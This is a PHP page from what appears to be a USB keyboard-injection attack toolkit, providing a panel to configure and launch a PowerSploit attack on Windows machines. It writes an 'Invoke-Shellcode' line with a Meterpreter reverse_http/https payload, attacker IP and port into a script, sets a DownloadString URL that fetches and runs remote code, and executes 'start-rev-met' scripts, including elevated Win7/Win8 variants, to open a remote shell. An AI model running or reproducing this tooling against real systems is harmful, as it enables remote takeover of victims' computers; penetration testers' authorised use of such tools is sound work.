<?php
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
switch ($lang){
  case "fr":
    $lang="fr_FR";
    break;
  default:
    $lang="C";
    break;
}

if (isset($_POST['action']) && $_POST['action'] == 'update' && isset($_POST['tab']) && $_POST['tab'] == 'powersploit'):
	$error = false;
	$address	= trim(strip_tags($_POST['input-address']));
	$port		= (int) $_POST['input-port'];
	$option		= trim(strip_tags($_POST['seloption']));
	if (filter_var($address, FILTER_VALIDATE_IP) && $port >= 0 && $port <= 65535 && in_array($option, array('windows/meterpreter/reverse_http', 'windows/meterpreter/reverse_https'))):
		$tmp = explode("\n", file_get_contents($files['powersploit']['path']));
		while (empty($tmp[count($tmp)-1])):
			unset($tmp[count($tmp)-1]);
		endwhile;
		$tmp[count($tmp)-1] = 'Invoke-Shellcode -Payload '.$option.' -Lhost '.$address.' -Lport '.$port.' -Force';
		$con = implode("\n", $tmp);
		file_put_contents($files['powersploit']['path'], $con);
	else:
		$error = true;
	endif;
	$new_url		= trim(strip_tags($_POST['input-url']));
	if (!$error && (filter_var($new_url, FILTER_VALIDATE_IP) || filter_var($new_url, FILTER_VALIDATE_URL))):
		$urlFile = file_get_contents($files['powersploit']['path2']);
		$tmp = preg_replace('/DownloadString\("(.*)/', 'DownloadString("'.$new_url.'")', $urlFile);
		file_put_contents($files['powersploit']['path2'], $tmp);
	else:
		$error = true;
	endif;
	if ($error):
		$message = 'Invalid input!';
	else:
		$message = 'Options updated!';
	endif;
elseif (isset($_POST['action']) && $_POST['action'] === 'updateSource' && isset($_POST['tab']) && $_POST['tab'] == 'powersploit'):
	$new_source = trim(strip_tags($_POST['source']));
	file_put_contents($files['powersploit']['path'], $new_source);
	$message = 'Source updated!';
elseif (isset($_GET['action']) && $_GET['action'] === 'execute' && isset($_GET['tab']) && $_GET['tab'] == 'powersploit'):
	$elevated = isset($_GET['elevated']) && (int) $_GET['elevated'] === 1	?	1	:0;
	$platform = isset($_GET['platform']) && in_array(strip_tags(trim($_GET['platform'])), array('windows7', 'windows8'))	?		strip_tags(trim($_GET['platform']))	:	'';
	if ($elevated === 0) {
		$res = shell_exec("LANG=$lang start-rev-met");
		$message = 'Attack executed!';
	}
	elseif (!empty($platform)) {
		switch($platform):
			case 'windows7':
				$res = shell_exec("LANG=$lang start-rev-met-elevated-win7");
				break;
			case 'windows8':
				$res = shell_exec("LANG=$lang start-rev-met-elevated-win8");
				break;
		endswitch;
		$message = 'Attack executed!';
	} else {
		$message = 'Invalid options!';
	}
	ob_clean();
	echo $message;
	die();
endif;
$address	= '';
$port		= '';
$option		= '';
$protocol	= 'http://';
$url		= '';
if (is_file($files['powersploit']['path']) && is_readable($files['powersploit']['path'])) {
	$con = file_get_contents($files['powersploit']['path']);
	if (!empty($con)) {
		$tmp = explode("\n", $con);
		while (empty($tmp[count($tmp)-1])):
			unset($tmp[count($tmp)-1]);
		endwhile;
		$tmp3 = explode(" ", $tmp[count($tmp)-1]);
		$address	= $tmp3[4];
		$port		= $tmp3[6];
		$option		= $tmp3[2];
		if (is_file($files['powersploit']['path2']) && is_readable($files['powersploit']['path2'])) {
			$urlFile = file_get_contents($files['powersploit']['path2']);
			preg_match('/DownloadString\("(.*)"\)/', $urlFile, $match);
			$url = $match[1];
		}
	}
}
?>
<?php require dirname(__FILE__).'/messages.php';?>
<ul class="nav nav-tabs" role="tablist">
	<li class="active"><a href="#powerspolitoptions" role="tab" data-toggle="tab">Options</a></li>
	<li class=""><a href="#powersploitsource" role="tab" data-toggle="tab">Source</a></li>
</ul>
<div class="tab-content" id="powersploit-tab">
	<div id="powerspolitoptions" class="tab-pane fade in active">
		<form action="index.php#powersploit" method="POST">
			<input type="hidden" name="action" value="update" />
			<input type="hidden" name="tab" value="powersploit" />
			<input type="hidden" name="k" value="hid" />
			<div class="form-group">
				<label for="input-address">IP Address:</label>
				<input id="input-address" class="form-control" type="text" name="input-address" placeholder="<?php echo $address;?>" value="<?php echo $address;?>" />
			</div>
			<div class="form-group">
				<label for="input-port">Port:</label>
				<input id="input-port" class="form-control" type="text" name="input-port" placeholder="<?php echo $port;?>" value="<?php echo $port;?>" />
			</div>
			<div class="form-group">
				<label for="input-select">Payload:</label>
				<select class="form-control" id="input-select" name="seloption">
				  	<option value="windows/meterpreter/reverse_http"<?php if ($option == 'windows/meterpreter/reverse_http'): echo ' selected'; endif;?>>windows/meterpreter/reverse_http</option>
					<option value="windows/meterpreter/reverse_https"<?php if ($option == 'windows/meterpreter/reverse_https'): echo ' selected'; endif;?>>windows/meterpreter/reverse_https</option>
				</select>
			</div>
			<div class="form-group">
				
				<label for="input-url">URL:</label>
					<input id="input-url" class="form-control" type="text" name="input-url" placeholder="<?php echo $url;?>" value="<?php echo $url;?>" />
				</div>
			<input class="btn btn-primary btn-sm" type="submit" value="Update" name="commit" />
		</form>
	</div>
	<div id="powersploitsource" class="tab-pane fade in">
		<form action="index.php#powersploit" method="POST">
			<input type="hidden" name="k" value="hid" />
			<input type="hidden" name="tab" value="powersploit" />
			<input type="hidden" name="action" value="updateSource" />
			<div class="form-group">
				<textarea name="source" id="input-source" class="form-control panel-body md-input" rows="20"><?php echo $con;?></textarea>
			</div>
			<input class="btn btn-primary btn-sm" type="submit" value="Update" name="commit">
		</form>
	</div>
</div> <!-- end of .tab-content -->


<div class="bottom-buttons-group">
	<form action="index.php?#powersploit" method="post" class="form-inline" id="powersploit-elevator-form" onsubmit="return elevatorFormSubmited('powersploit');">
		<input type="hidden" name="k" value="hid">
		<input type="hidden" name="tab" value="powersploit">
		<input type="hidden" name="action" value="execute">
		<input class="btn btn-success btn-sm fixed-btn" type="submit" value="Execute" name="commit">
		<a href="javascript:void(0);" onclick="return resetUsb('powersploit');" class="fixed-btn"><input class="btn btn-warning btn-sm" type="button" value="Reset USB" name="commit"></a>
		
		<label class="checkbox-inline fixed-btn" for="powersploit-elevated" style="margin-top:4px;">
  			<input type="checkbox" id="powersploit-elevated" name="elevated" class="hidsCheck"> Admin
		</label>
		<select class="fixed-btn select2drop" name="platform" id="powersploit-platform">
  			<option value="windows7">Win7</option>
  			<option value="windows8">Win8</option>
		</select>
	</form>
</div>
